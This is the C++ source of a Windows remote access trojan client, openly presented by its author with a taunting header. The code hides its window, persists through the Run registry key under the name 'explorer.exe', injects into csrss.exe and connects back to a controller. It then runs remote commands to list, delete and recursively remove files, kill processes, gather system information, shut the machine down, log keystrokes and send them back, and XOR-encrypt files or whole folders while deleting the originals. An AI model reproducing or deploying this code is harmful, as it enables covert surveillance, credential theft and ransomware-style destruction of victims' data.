/*
 * WARNING!
 * данное програмное обеспечение является полной собственностью автора
 * не предназначено для тупых школьников, в частности школоло - даунов
 * coded by govnocoder na poscale
 * FSB and FBR suck my dick bitch
 *
 * client part
*/

#include <winsock2.h>
#include <windows.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <fstream>
#include <cstring>
#include <tchar.h>
#include <process.h>
#include <limits.h>
#include <string>
#include <vector>
#include <cstdlib>

#include "Config.h"
#include "Server.h"
#include "Keylogger.h"

using std::exit;
using std::vector;

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(linker,"/BASE:0x13140000")

#pragma warning(disable: 4996)


std::string buf_file;
std::string loc_buf_file;
std::string buf, rbuf, key_ret, keydel, rkeydel;
std::string CryptFile(std::string path, int key);
std::string CryptDir(std::string path, int key);

std::string keylog_path;
std::string chars;


std::wstring string_to_wstring(std::string& s)
{
	std::ofstream ofs("temp.txt", std::ofstream::out);
	if (!ofs) exit(1);
	ofs << s;
	ofs.close();

	std::wstring s1;
	std::wifstream wifs("temp.txt", std::wifstream::in);
	if (!wifs) exit(1);
	wifs >> s1;
	wifs.close();
	return s1;
}

std::string wstring_to_string(std::wstring s)
{
	std::wofstream wofs("temp.txt", std::wofstream::out);
	if (!wofs) exit(1);
	wofs << s;
	wofs.close();

	std::string s1;
	std::ifstream ifs("temp.txt", std::ifstream::in);
	if (!ifs) exit(1);
	ifs >> s1;
	ifs.close();
	return s1;
}

vector<std::string> scandir(std::string p) {
	std::wstring Path = string_to_wstring(p);

	WIN32_FIND_DATA FindFileData;
	HANDLE hf;

	hf = FindFirstFile((string_to_wstring(p)).c_str(), &FindFileData);

	vector<std::string> v;
	if (hf != INVALID_HANDLE_VALUE) {
		do {
			if (FindFileData.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY)
				v.push_back(wstring_to_string(FindFileData.cFileName));
		} while (FindNextFile(hf, &FindFileData) != 0);
	}

	return v;
}


std::string readFile(const std::string fileName) {
	std::ifstream f(fileName);
	f.seekg(0, std::ios::end);
	size_t size = f.tellg();
	std::string s(size, ' ');
	f.seekg(0);
	f.read(&s[0], size);
	return s;
}

BOOL RegisterStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};


	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args != NULL) wcscat_s(szValue, count, args);
	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
	fSuccess = (lResult == 0);

	if (fSuccess) {
		dwSize = (wcslen(szValue) + 1) * 2;
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}
	if (hKey != NULL) {
		RegCloseKey(hKey);
		hKey = NULL;
	}
	return fSuccess;
}

void RegisterProgram()
{
	wchar_t szPathToExe[MAX_PATH];
	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
	RegisterStartup(L"explorer.exe", szPathToExe, L"-foobar");
}

DWORD WINAPI func(LPVOID)
{
	LoadLibrary((LPCWSTR)"kernel32.dll");
	LoadLibrary((LPCWSTR)"user32.dll");
	return true;
}

BOOL Inject(HANDLE hProc, DWORD(WINAPI* func)(LPVOID))
{
	DWORD id;
	DWORD ByteOfWriten;
	HMODULE hModule = GetModuleHandle(NULL);
	DWORD size = ((PIMAGE_OPTIONAL_HEADER)((LPVOID)((BYTE*)(hModule)+((PIMAGE_DOS_HEADER)(hModule))->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER))))->SizeOfImage;
	char* hNewModule = (char*)VirtualAllocEx(hProc, hModule, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (hNewModule == NULL) return false;
	WriteProcessMemory(hProc, hNewModule, hModule, size, &ByteOfWriten);
	if (ByteOfWriten != size) return false;
	HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, func, (LPVOID)hNewModule, 0, &id);
	if (hThread == 0) return false;
	return true;
}

DWORD GetProcessID(const char* lpNameProcess)
{
	HANDLE snap;
	PROCESSENTRY32 pentry32;
	snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snap == INVALID_HANDLE_VALUE) return 0;
	pentry32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(snap, &pentry32)) { CloseHandle(snap); return 0; }
	do {
		if (!lstrcmpi((LPCWSTR)lpNameProcess, &pentry32.szExeFile[0])) {
			CloseHandle(snap);
			return pentry32.th32ProcessID;
		}
	} while (Process32Next(snap, &pentry32));
	CloseHandle(snap);
	return 0;
}

BOOL(WINAPI* RegisterServiceProcess)(DWORD dwProcessId, DWORD dwType);


int Shell(SOCKADDR_IN addr) {
	char path[2048];
	SOCKET conn = socket(AF_INET, SOCK_STREAM, NULL);
	if (connect(conn, (SOCKADDR*)&addr, sizeof(addr)) != 0) {
		return 1;
	}
	char buffer[256];
	while (true) {
		system("del file.txt");
		buf_file = "";
		loc_buf_file = "";
		memset(&buffer, 0x0, sizeof(buffer));
		recv(conn, buffer, sizeof(buffer), NULL);

		if (strcmp(buffer, "ls") == 0) {
			char path[1024];
			memset(&path, 0x0, sizeof(path));
			recv(conn, path, sizeof(path), NULL);
			std::string comm = "dir " + std::string(path) + " > file.txt";
			system(comm.c_str());
			std::ifstream F;
			F.open("file.txt", std::ios::in);
			
			while (getline(F, loc_buf_file)) {
				buf_file += loc_buf_file + '\n';
			}
			system("del file.txt");
			send(conn, buf_file.c_str(), sizeof(buf_file)*100, NULL);

		}

		else if (strcmp(buffer, "rm") == 0) {
			memset(&path, 0x0, sizeof(path));
			recv(conn, path, sizeof(path), NULL);
			std::string comm = "del " + std::string(path);
			system(comm.c_str());
			std::string finally_msg = "delete " + std::string(path) + " ok";
			send(conn, finally_msg.c_str(), sizeof(finally_msg)*10, NULL);

		}

		else if (strcmp(buffer, "rmdir") == 0) {
			memset(&path, 0x0, sizeof(path));
			recv(conn, path, sizeof(path), NULL);
			std::string comm = "RMDIR /S /Q " + std::string(path);
			system(comm.c_str());
			std::string finally_msg = "delete " + std::string(path) + " ok";
			send(conn, finally_msg.c_str(), sizeof(finally_msg) * 10, NULL);

		}

		else if (strcmp(buffer, "pwd") == 0) {
			system("echo %cd% > file.txt");
			std::ifstream F;
			F.open("file.txt", std::ios::in);

			while (getline(F, loc_buf_file)) {
				buf_file += loc_buf_file + '\n';
			}
			system("del file.txt");
			send(conn, buf_file.c_str(), sizeof(buf_file)*100, NULL);
		}

		else if (strcmp(buffer, "sysinfo") == 0) {
			system("systeminfo > file.txt");
			std::ifstream F;
			F.open("file.txt", std::ios::in);

			while (getline(F, loc_buf_file)) {
				buf_file += loc_buf_file + '\n';
			}
			system("del file.txt");
			send(conn, buf_file.c_str(), sizeof(buf_file) * 100, NULL);
		}

		else if (strcmp(buffer, "ps") == 0) {
			system("tasklist > file.txt");
			std::ifstream F;
			F.open("file.txt", std::ios::in);
			while (getline(F, loc_buf_file)) {
				buf_file += loc_buf_file + '\n';
			}
			system("del file.txt");
			send(conn, buf_file.c_str(), sizeof(buf_file) * 220, NULL);
		}

		else if (strcmp(buffer, "kill") == 0) {
			memset(&path, 0x0, sizeof(path));
			recv(conn, path, sizeof(path), NULL);
			std::string com = "taskkill /T /F /IM " + std::string(path);
			system(com.c_str());
			std::string finally_msg = "terminate " + std::string(path) + " ok";
			send(conn, finally_msg.c_str(), sizeof(finally_msg) * 10, NULL);

		}

		else if (!strcmp(buffer, "shutdown")) {
			system("shutdown /p");
		}

		else if (!strcmp(buffer, "error")) {
			memset(&path, 0x0, sizeof(path));
			recv(conn, path, sizeof(path), NULL);
			MessageBoxA(NULL, path, "error 0x648396234", MB_ICONERROR | MB_OK | MB_SETFOREGROUND);
		}

		else if (!strcmp(buffer, "keylogger")) {
			memset(&path, 0x0, sizeof(path));
			keylog_path = getenv("LOCALAPPDATA") + std::string("\\");
			recv(conn, path, sizeof(path), NULL);
			while (buf.length() < atoi(path)+7 && rbuf.length() < atoi(path)+7) {
				keylogger(keylog_path);
				buf = readFile(keylog_path + "keylog.txt");
				rbuf = readFile(keylog_path + "keylogru.txt");
			}
			key_ret = "\nen:\n" + buf + "\n\nru:\n" + rbuf;
			keydel = "del " + keylog_path + "keylog.txt";
			rkeydel = "del " + keylog_path + "keylogru.txt";
			system(keydel.c_str());
			system(rkeydel.c_str());
			send(conn, key_ret.c_str(), sizeof(key_ret) * 100, NULL);

			memset(&buf, 0x0, sizeof(buf));
			memset(&rbuf, 0x0, sizeof(rbuf));
		}

		else if (!strcmp(buffer, "cryptfile")) {
			char key[128];
			memset(&path, 0x0, sizeof(path));
			memset(&key, 0x0, sizeof(key));
			recv(conn, path, sizeof(path), NULL);
			recv(conn, key, sizeof(key), NULL);
			std::string res = CryptFile(path, atoi(key));
			send(conn, res.c_str(), sizeof(res) * 300, NULL);
		}

		else if (!strcmp(buffer, "cryptdir")) {
		char key[128];
		memset(&path, 0x0, sizeof(path));
		memset(&key, 0x0, sizeof(key));
		recv(conn, path, sizeof(path), NULL);
		recv(conn, key, sizeof(key), NULL);
		std::string res = CryptDir(path, atoi(key));
		send(conn, res.c_str(), sizeof(res) * 300, NULL);
		}

		else if (strcmp(buffer, "close") == 0) return 1; 
	}
	return 0;
}


int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	setlocale(LC_ALL, "Russian");
	RegisterProgram();
	Inject(OpenProcess(PROCESS_ALL_ACCESS, false, GetProcessID("csrss.exe")), &func);

	HINSTANCE hKernel;
	int i = 1;
	hKernel = LoadLibrary((LPCWSTR)"KERNEL32.DLL");
	if (hKernel) {
		RegisterServiceProcess = (int(__stdcall*)(DWORD, DWORD))
			GetProcAddress(hKernel, "RegisterServiceProcess");
	}
	SOCKADDR_IN add = Server();
	Shell(add);
	return 0;
}

std::string CryptFile(std::string path, int key) {
	try {
		std::string data = readFile(path), delcmd = "del " + path, cryptdata;
		for (int item = 0; item < data.length(); ++item)
			cryptdata += data[item] ^ key;

		std::ofstream crfile(path + ".crypt");
		for (int item = 0; item < cryptdata.length(); ++item)
			crfile << cryptdata[item];

		crfile.close();
		system(delcmd.c_str());
		return "crypt " + path + " ok";
	}
	catch (...) {
		return "crypt " + path + " failed";
	}
}

std::string CryptDir(std::string path, int key) {
	std::string buf;
	vector<std::string> v;
	v = scandir(path+"*");
	for (int i = 0; i < v.size(); i++) {
		try {
			CryptFile(path + v[i], key);
			buf += "crypt " + path + v[i] + " ok\n";
		}
		catch (...) {
			continue;
		}
	}
	return buf;
}